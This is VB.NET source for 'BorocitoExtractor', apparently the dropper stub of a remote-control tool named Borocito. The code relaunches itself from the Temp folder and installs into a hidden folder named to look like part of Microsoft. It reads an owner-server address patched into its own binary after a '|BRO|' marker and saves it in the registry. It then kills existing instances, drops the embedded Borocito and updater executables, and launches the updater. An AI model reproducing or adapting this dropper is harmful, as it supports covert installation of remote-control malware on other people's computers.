Imports System.IO
Imports Microsoft.Win32
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Public DIRTemp As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
End Module
Module Utility
    Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Extractor.log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\Extractor.log", vbCrLf & Message, OverWrite)
            Catch
            End Try
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
        End Try
    End Sub
End Module
Module Memory
    Public OwnerServer As String = Nothing
    Sub LoadInject()
        Try
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
            Dim stubb As String = Space(LOF(1))
            Dim FileSplit = "|BRO|"
            FileGet(1, stubb)
            FileClose(1)
            Dim opt() As String = Split(stubb, FileSplit)
            OwnerServer = opt(1)
        Catch ex As Exception
            AddToLog("LoadInject@Memory", "Error: " & ex.Message, True)
            End
        End Try
    End Sub
    Sub PutInject()
        Try
            If My.Computer.FileSystem.FileExists(DIRCommons & "\BorocitoExtractor.exe") Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\BorocitoExtractor.exe")
            End If
            Dim stub As String
            Const FS1 As String = "|BRO|"
            Dim Temp As String = DIRCommons & "\BorocitoExtractor.exe"
            Dim bytesEXE As Byte() = System.IO.File.ReadAllBytes(Application.ExecutablePath)
            File.WriteAllBytes(Temp, bytesEXE)
            FileOpen(1, Temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            FileOpen(1, Temp, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, stub & FS1 & OwnerServer & FS1)
            FileClose(1)
        Catch ex As Exception
            AddToLog("PutInject@Memory", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module StartUp
    Sub Init()
        Try
            'Inicia desde otra ubicacion
            RunFromLocation()
            'Crear las carpetas necesarias en raiz
            CreateRootFolders()
            'Lee los datos del inyectado
            LoadInject()
            'Ver si ya existe una instancia anterior
            CheckIfExist()
            'Extraer
            StartExtract()
            'Iniciar
            InitUpdater()
        Catch ex As Exception
            AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub RunFromLocation()
        Try
            If Application.StartupPath.Contains("Local\Temp") = False Then
                If My.Computer.FileSystem.FileExists(DIRTemp & "\BoroExtractor.exe") Then
                    My.Computer.FileSystem.DeleteFile(DIRTemp & "\BoroExtractor.exe")
                End If
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRTemp & "\BoroExtractor.exe")
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\BorocitoExtractor.exe")
                Process.Start(DIRTemp & "\BoroExtractor.exe", parameters)
                End
            End If
        Catch ex As Exception
            AddToLog("RunFromLocation@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CreateRootFolders()
        Try
            If My.Computer.FileSystem.DirectoryExists(DIRCommons) = False Then
                My.Computer.FileSystem.CreateDirectory(DIRCommons)
            End If
        Catch ex As Exception
            AddToLog("CreateRootFolders@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CheckIfExist()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
            If regKey Is Nothing Then
                Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito")
                regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
                regKey.SetValue("OwnerServer", OwnerServer, RegistryValueKind.String)
            Else
                OwnerServer = regKey.GetValue("OwnerServer")
            End If
        Catch ex As Exception
            AddToLog("CheckIfExist@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StartExtract()
        Try
            Try
                Dim Borocito As Process() = Process.GetProcessesByName("Borocito")
                If Borocito.Length >= 1 Then
                    Borocito(0).Kill()
                End If
                Dim Updater As Process() = Process.GetProcessesByName("BorocitoUpdater")
                If Updater.Length = 1 Then
                    Updater(0).Kill()
                End If
            Catch
            End Try
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
            End If
            My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\Borocito.exe", My.Resources.Borocito, False)
            If My.Computer.FileSystem.FileExists(DIRCommons & "\BorocitoUpdater.exe") Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\BorocitoUpdater.exe")
            End If
            My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\BorocitoUpdater.exe", My.Resources.Updater, False)
        Catch ex As Exception
            AddToLog("StartExtract@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub InitUpdater()
        Try
            Process.Start(DIRCommons & "\BorocitoUpdater.exe")
            End
        Catch ex As Exception
            AddToLog("InitAll@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module